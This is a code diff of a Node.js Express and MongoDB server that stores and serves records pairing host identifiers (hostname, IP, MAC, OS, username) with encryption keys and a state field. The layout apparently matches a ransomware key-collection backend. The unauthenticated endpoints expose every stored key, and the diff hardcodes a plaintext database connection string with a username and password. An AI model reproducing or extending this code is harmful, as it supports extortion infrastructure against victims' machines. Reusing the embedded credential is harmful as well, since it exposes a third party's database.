@@ -1,19 +1,15 @@
-// server.js
-
 const express = require('express');
 const mongoose = require('mongoose');
 const cors = require('cors');
-require('dotenv').config();
 
 const app = express();
 
-// Environment variables
-const PORT = process.env.PORT || 5000;
-const HOST_IP = process.env.HOST_IP || 'localhost';
-const MONGODB_URI = process.env.MONGODB_URI;
+// Use fixed port 5000
+const PORT = 5000;
+const MONGODB_URI ="mongodb+srv://gaourangbaria1002:rgAG1ac59Bvj28Wy@cluster0.jwx8zgp.mongodb.net/?retryWrites=true&w=majority&appName=Cluster00";
 
 // Middleware
-app.use(cors()); // Allow all origins for local development
+app.use(cors());
 app.use(express.json());
 
 // MongoDB Connection
@@ -21,7 +17,7 @@ mongoose.connect(MONGODB_URI)
   .then(() => console.log('MongoDB Connected'))
   .catch(err => console.error('MongoDB Connection Error:', err));
 
-// Define Schema
+// Schema & Model
 const encryptionKeySchema = new mongoose.Schema({
   hostname: String,
   ip_address: String,
@@ -37,34 +33,27 @@ const encryptionKeySchema = new mongoose.Schema({
   sent_at: String
 });
 
-// Create Model
 const EncryptionKey = mongoose.model('EncryptionKey', encryptionKeySchema);
 
-// Routes
-
-// Get all keys
+// Routes (same as before)
 app.get('/api/keys', async (req, res) => {
   try {
     const keys = await EncryptionKey.find().sort({ sent_at: -1 });
     res.json(keys);
   } catch (err) {
-    console.error('Error fetching keys:', err);
     res.status(500).json({ error: 'Server error' });
   }
 });
 
-// Get keys by username
 app.get('/api/keys/:userId', async (req, res) => {
   try {
     const keys = await EncryptionKey.find({ username: req.params.userId }).sort({ sent_at: -1 });
     res.json(keys);
   } catch (err) {
-    console.error('Error fetching keys for user:', err);
     res.status(500).json({ error: 'Server error' });
   }
 });
 
-// Update key state
 app.patch('/api/keys/:keyId/state', async (req, res) => {
   try {
     const { state } = req.body;
@@ -81,22 +70,15 @@ app.patch('/api/keys/:keyId/state', async (req, res) => {
     }
     res.json(updatedKey);
   } catch (err) {
-    console.error('Error updating key state:', err);
     res.status(500).json({ error: 'Server error' });
   }
 });
 
-// Create new key
 app.post('/api/keys', async (req, res) => {
   try {
     const {
-      hostname,
-      ip_address,
-      mac_address,
-      os_info,
-      username,
-      encryption_key,
-      state
+      hostname, ip_address, mac_address, os_info,
+      username, encryption_key, state
     } = req.body;
 
     const newKey = new EncryptionKey({
@@ -113,12 +95,10 @@ app.post('/api/keys', async (req, res) => {
     const savedKey = await newKey.save();
     res.status(201).json(savedKey);
   } catch (err) {
-    console.error('Error creating key:', err);
     res.status(500).json({ error: 'Server error' });
   }
 });
 
-// Delete key
 app.delete('/api/keys/:keyId', async (req, res) => {
   try {
     const deletedKey = await EncryptionKey.findByIdAndDelete(req.params.keyId);
@@ -127,12 +107,15 @@ app.delete('/api/keys/:keyId', async (req, res) => {
     }
     res.json({ message: 'Key deleted successfully' });
   } catch (err) {
-    console.error('Error deleting key:', err);
     res.status(500).json({ error: 'Server error' });
   }
 });
 
-// Start Server
-app.listen(PORT, HOST_IP, () => 
-  console.log(`Server running at http://${HOST_IP}:${PORT}`)
-);
+// Listen on 0.0.0.0:5000
+// app.listen(PORT, '0.0.0.0', () => console.log(`Server running at http://0.0.0.0:${PORT}`));
+
+app.listen(5000, '0.0.0.0', () => {
+  console.log("Server running on port 5000");
+});
+
+
